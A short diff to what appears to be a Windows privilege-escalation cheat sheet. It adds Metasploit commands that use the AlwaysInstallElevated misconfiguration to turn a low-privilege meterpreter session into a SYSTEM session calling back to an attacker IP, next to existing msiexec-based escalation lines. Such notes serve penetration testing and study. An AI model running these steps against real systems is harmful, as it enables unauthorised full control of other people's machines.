@@ -351,6 +351,14 @@ msiexec /quiet /qn /i C:\Temp\setup.msi
 
 net local administrators
 #our user is added to Administrators group
+
+# Or from the meterpreter of low priviliged user, background the session. And use
+use exploit/windows/local/always_install_elevated 
+set session <SESSION ID>
+set LHOST <ATTACKER IP>
+run
+
+# You will be given a meterpreter session of NT Authority System
 ```
 
 ```shell
